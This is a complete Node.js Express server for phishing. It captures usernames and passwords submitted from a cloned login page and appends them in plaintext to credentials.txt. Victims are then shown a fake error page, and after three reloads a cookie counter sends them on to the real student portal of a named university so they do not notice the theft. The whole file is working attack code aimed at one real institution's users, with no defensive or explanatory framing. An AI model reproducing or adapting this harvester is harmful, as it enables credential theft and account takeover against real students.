const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser'); // Add cookie-parser to handle cookies

const app = express();
const PORT = 3000;
const RELOAD_LIMIT = 3; // Number of reloads before redirecting to the actual site

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));
app.use(cookieParser()); // Use cookie-parser middleware

// Handle POST request to capture credentials
app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    // Save the credentials to a file
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Failed to write to file', err);
            res.status(500).send('Server error');
        } else {
            console.log('Credentials captured');
            res.redirect('/error'); // Redirect to fake error page after capturing credentials
        }
    });
});

// Serve the fake error page with reload counter
app.get('/error', (req, res) => {
    let reloadCount = parseInt(req.cookies.reloadCount) || 0;

    if (reloadCount >= RELOAD_LIMIT) {
        // If the reload limit is reached, redirect to the actual site
        res.redirect('https://student.geu.ac.in/');
    } else {
        // Increment the reload count and set the cookie
        reloadCount++;
        res.cookie('reloadCount', reloadCount, { maxAge: 900000, httpOnly: true });
        res.sendFile(path.join(__dirname, 'sdanlknjsaflndasf.html')); // Serve the fake error page
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
